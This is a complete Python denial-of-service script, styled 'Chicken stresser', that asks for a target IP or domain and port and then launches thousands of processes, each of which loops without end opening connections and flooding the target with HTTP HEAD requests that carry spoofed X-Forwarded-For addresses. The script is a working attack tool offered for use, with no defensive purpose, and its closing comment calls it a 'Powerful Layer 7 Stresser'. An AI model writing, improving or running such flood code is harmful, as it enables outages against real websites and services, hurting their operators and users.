import socket
import os, sys
import time
import multiprocessing, random

print("[<<<] Welcome to Chicken stresser [>>>]")
ip = input("[>] IP/Domain: ")
port = int(input("[>] Port: "))

url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

print("[>>>] Launching Chicken [<<<]")

time.sleep(3)

def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(1)
    except:
      pass

def sendattack():
  for i in range(5000):
    mp = multiprocessing.Process(target=attack)
    mp2 = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp2.setDaemon = False
    mp.start()
    mp2.start()

sendattack()
# 60 Line for Powerful Layer 7 Stresser Cool!
